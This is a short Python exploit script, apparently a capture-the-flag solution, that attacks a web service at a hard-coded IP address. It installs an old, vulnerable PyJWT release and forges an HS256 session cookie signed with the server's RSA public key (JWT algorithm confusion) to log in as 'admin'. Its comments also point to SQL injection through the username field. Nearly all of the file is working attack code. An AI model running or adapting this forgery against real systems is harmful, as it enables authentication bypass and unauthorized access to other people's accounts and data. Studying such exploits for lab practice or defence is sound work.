#!/usr/bin/env python3

import os

os.system("python -m pip install requests --no-cache-dir")
# I want to be able to sign a jwt using a public key as secret; hence, pyjwt==0.4.3.
# https://security.stackexchange.com/a/187279
os.system("python -m pip install pyjwt==0.4.3 --no-cache-dir")

import requests
import jwt
import datetime


URL = "http://178.128.40.63:30886/"
PUB_KEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n"
USER = 'admin' # NOTE: this user exists, we just created.
# NOTE: Since we have the public key, we can forge the session cookie by symmetric signing method.
# HS256 is a symmetric signing method. This means that the same secret key is used to both
# create and verify the signatur. https://www.loginradius.com/blog/async/jwt-signing-algorithms/
# NOTE: username will be the target for sql injection.
# See src/helpers/DBHelper.js:11
encoded = jwt.encode({ "username": USER, "pk": PUB_KEY, "iat": datetime.datetime.utcnow() },
                     PUB_KEY, algorithm="HS256")
print(encoded)
s = requests.Session()
c = requests.cookies.create_cookie(name='session', value=encoded.decode('UTF-8'))
s.cookies.set_cookie(c)
r = s.get(URL)
assert "doesn't exist in our database." not in r.text, "error"
print(r.text)